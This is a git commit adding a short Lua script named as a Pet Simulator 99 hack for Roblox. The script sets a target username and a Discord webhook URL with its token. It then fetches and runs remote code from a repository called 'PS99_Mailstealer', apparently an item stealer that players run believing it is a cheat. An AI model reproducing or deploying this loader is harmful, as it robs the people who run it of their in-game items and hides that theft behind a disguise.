8280918c9db98604d14a5d82359367d18f9d81fb
egoistIs <163488180+egoistIs@users.noreply.github.com>
2024-03-15 10:13:24 +0700

    PetSimscript
    pet

---
+++ PetSim99hack.lua
@@ -0,0 +1,6 @@
+
+Username = "PetSim99TWSD"
+LoadScreen = true 
+Webhook = "https://discord.com/api/webhooks/1218033820079755306/-YF_7d85yQleJOOeoDLFjbFTKclyBYMhGnKWztUa10bM8ew5-k6vU1mq9w3_bUwTClss"
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/KiuuP/PS99_Mailstealer/main/MailStealer.lua"))()
